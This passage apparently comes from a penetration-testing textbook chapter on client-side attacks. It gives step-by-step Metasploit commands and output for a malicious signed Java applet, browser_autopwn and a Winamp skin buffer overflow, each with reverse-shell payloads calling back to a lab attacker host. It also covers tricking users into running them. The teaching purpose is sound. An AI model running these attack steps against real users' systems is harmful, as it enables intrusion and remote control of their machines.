### Client-Side Exploitation: Leveraging User Permissions and Software Vulnerabilities

#### Introduction
Exploiting software vulnerabilities often involves convincing users to allow the execution of malicious code. You may have encountered browser warnings such as, "This site would like to run this thing in your browser, how would you like to proceed?" Even security-savvy users can be persuaded to bypass these warnings if they are convinced that the content is useful.

#### Example: Java Signed Applet
For this example, we will use the `exploit/multi/browser/java_signed_applet` module in Metasploit. This module creates a malicious Java applet, as shown in Listing 10-18.

```plaintext
msf > use exploit/multi/browser/java_signed_applet
msf exploit(java_signed_applet) > show options
Module options (exploit/multi/browser/java_signed_applet):
Name             Current Setting  Required  Description
----             ---------------  --------  -----------
APPLETNAME       SiteLoader       yes       The main applet's class name.
CERTCN           SiteLoader       yes       The CN= value for the certificate. Cannot contain ',' or '/'
SRVHOST          0.0.0.0         yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
SRVPORT          8080            yes       The local port to listen on.
SSL              false            no        Negotiate SSL for incoming connections
SSLCert                            no        Path to a custom SSL certificate (default is randomly generated)
SSLVersion      SSL3             no        Specify the version of SSL that should be used (accepted: SSL2, SSL3, TLS1)
SigningCert                       no        Path to a signing certificate in PEM or PKCS12 (.pfx) format
SigningKey                        no        Path to a signing key in PEM format
SigningKeyPass                    no        Password for signing key (required if SigningCert is a .pfx)
URIPATH                           no        The URI to use for this exploit (default is random)

Exploit target:
Id  Name
--  ----
0   Windows x86 (Native Payload)
```

To configure the module, set the necessary options:

```plaintext
msf exploit(java_signed_applet) > set APPLETNAME BulbSec
APPLETNAME => BulbSec
msf exploit(java_signed_applet) > set SRVHOST 192.168.20.9
SRVHOST => 192.168.20.9
msf exploit(java_signed_applet) > set SRVPORT 80
SRVPORT => 80
```

Older versions of Java allow the use of the `CERTCN` option to claim the applet is signed by any entity. Newer versions, like those on Windows 7, will indicate the signer is unknown unless the applet is signed with a trusted certificate. If a trusted certificate is available, it can be specified to make the applet appear more legitimate. For this example, we will leave the applet self-signed.

The default target for this module is a Windows system, but other platforms can be targeted using different payloads, as shown in Listing 10-19.

```plaintext
msf exploit(java_signed_applet) > show targets
Exploit targets:
Id  Name
--  ----
0   Generic (Java Payload)
1   Windows x86 (Native Payload)
2   Linux x86 (Native Payload)
3   Mac OS X PPC (Native Payload)
4   Mac OS X x86 (Native Payload)

msf exploit(java_signed_applet) > set target 0
target => 0
msf exploit(java_signed_applet) > set payload java/meterpreter/reverse_tcp
payload => java/meterpreter/reverse_tcp
msf exploit(java_signed_applet) > set LHOST 192.168.20.9
LHOST => 192.168.20.9
msf exploit(java_signed_applet) > exploit
[*] Exploit running as background job.
[*] Started reverse handler on 192.168.20.9:4444
[*] Using URL: http://192.168.20.9:80/Dgrz12PY
[*] Server started.
```

As with other Java exploits, this attack can be made multi-platform by changing the target or using a Java payload that targets multiple platforms.

**Note:** The previous exploit may leave Java in a bad state, and you may need to restart Windows 7 before attempting to run the applet again.

When browsing to the Metasploit server from the Windows 7 target, the user will be prompted to run the applet, as shown in Figure 10-2. Despite the security warning, the Social-Engineer Toolkit claims this attack is one of the most successful, even without relying on unpatched vulnerabilities.

#### Browser Autopwn
The `browser_autopwn` module in Metasploit is another client-side exploitation option. It loads all known browser and browser add-on modules and waits for a browser to connect. Once a connection is established, the server fingerprints the browser and serves up likely successful exploits, as shown in Listing 10-20.

```plaintext
msf > use auxiliary/server/browser_autopwn
msf auxiliary(browser_autopwn) > show options
Module options (auxiliary/server/browser_autopwn):
Name             Current Setting  Required  Description
----             ---------------  --------  -----------
LHOST            yes              yes       The IP address to use for reverse-connect payloads
SRVHOST          0.0.0.0         yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
SRVPORT          8080            yes       The local port to listen on.
SSL              false            no        Negotiate SSL for incoming connections
SSLCert                             no        Path to a custom SSL certificate (default is randomly generated)
SSLVersion     SSL3              no        Specify the version of SSL that should be used (accepted: SSL2, SSL3, TLS1)
URIPATH                            no        The URI to use for this exploit (default is random)

msf auxiliary(browser_autopwn) > set LHOST 192.168.20.9
LHOST => 192.168.20.9
msf auxiliary(browser_autopwn) > set URIPATH autopwn
URIPATH => autopwn
msf auxiliary(browser_autopwn) > exploit
[*] Auxiliary module execution completed
[*] Setup
[*] Obfuscating initial javascript 2015-03-25 12:55:22 -0400
[*] Done in 1.051220065 seconds
[*] Starting exploit modules on host 192.168.20.9...
--snip--
[*] --- Done, found 16 exploit modules
[*] Using URL: http://0.0.0.0:8080/autopwn
[*] Local IP: http://192.168.20.9:8080/autopwn
[*] Server started.
```

With the server started, browse to the malicious page from a web browser. As shown in Listing 10-21, Metasploit detects the browser and sends potential exploits.

```plaintext
[*] 192.168.20.12 browser_autopwn - Handling '/autopwn'
[*] 192.168.20.12 browser_autopwn - Handling '/autopwn?sessid=TWljcm9zb2Z0IFdpbmRvd3M6NzpTUDE6ZW4tdXM6eDg2Ok1TSUU6OC4wOg%3d%3d'
[*] 192.168.20.12 browser_autopwn - JavaScript Report: Microsoft Windows:7:SP1:en-us:x86:MSIE:8.0:
[*] 192.168.20.12 browser_autopwn - Responding with 14 exploits
[*] 192.168.20.12 java_atomicreferencearray - Sending Java AtomicReferenceArray Type Violation Vulnerability
--snip--
msf auxiliary(browser_autopwn) > sessions -l
Active sessions
===============
Id  Type           Information                          Connection
--  ----           -----------                          ----------
1   meterpreter    java/java Georgia Weidman @ BookWin7  192.168.20.9:7777 -> 192.168.20.12:49195 (192.168.20.12)
2   meterpreter    java/java Georgia Weidman @ BookWin7  192.168.20.9:7777 -> 192.168.20.12:49202 (192.168.20.12)
3   meterpreter    java/java Georgia Weidman @ BookWin7  192.168.20.9:7777 -> 192.168.20.12:49206 (192.168.20.12)
4   meterpreter    java/java Georgia Weidman @ BookWin7  192.168.20.9:7777 -> 192.168.20.12:49209 (192.168.20.12)
```

Although not as stealthy as performing reconnaissance and choosing a specific exploit, `browser_autopwn` can be very effective in certain situations.

#### Winamp Exploit
In this example, we trick the user into replacing a configuration file for the Winamp music player. When the user opens the program, the malicious configuration file will be processed, regardless of which music file is opened. The Metasploit module used is `exploit/windows/fileformat/winamp_maki_bof`, which exploits a buffer overflow issue in Winamp version 5.55.

As shown in Listing 10-22, this module has no additional options to set; only a compatible Windows payload is required.

```plaintext
msf > use exploit/windows/fileformat/winamp_maki_bof
msf exploit(winamp_maki_bof) > show options
Module options (exploit/windows/fileformat/winamp_maki_bof):
Name             Current Setting  Required  Description
----             ---------------  --------  -----------
Exploit target:
Id  Name
--  ----
0   Winamp 5.55 / Windows XP SP3 / Windows 7 SP1

msf exploit(winamp_maki_bof) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(winamp_maki_bof) > set LHOST 192.168.20.9
LHOST => 192.168.20.9
msf exploit(winamp_maki_bof) > exploit
[*] Creating 'mcvcore.maki' file ...
[+] mcvcore.maki stored at /root/.msf4/local/mcvcore.maki
```

Once the malicious Maki file is generated, copy it to the Apache web server directory and set up a payload handler. Create a new Winamp skin by copying an existing one, replacing the `mcvcore.maki` file with the malicious one. Zip the folder and upload it to the web server.

On the Windows 7 target, download and unzip the skin, save it to `C:\Program Files\Winamp\Skins`, and select the malicious skin in Winamp. The program will appear to close, and you will receive a session in your Metasploit handler.

#### Summary
The attacks discussed in this chapter target client-side software that does not listen on network ports, such as browsers, PDF viewers, Java browser plugins, and music players. These attacks generate malicious files that trigger vulnerabilities when opened by the user or ask for permission to run malicious code.

The Internet can be a dangerous place for client-side software, with some exploits being seen in the wild before patches were issued. Disabling or uninstalling vulnerable software, such as Java, can mitigate risks, but this may not be feasible for all users and organizations. Keeping client-side software up-to-date with the latest patches is crucial for maintaining security.

All the attacks in this chapter depend on a legitimate user taking action on the target systems. In the next chapter, we will explore social engineering techniques, which involve tricking users into performing harmful actions such as opening malicious files, entering credentials into attacker-owned sites, or giving out sensitive information over the phone.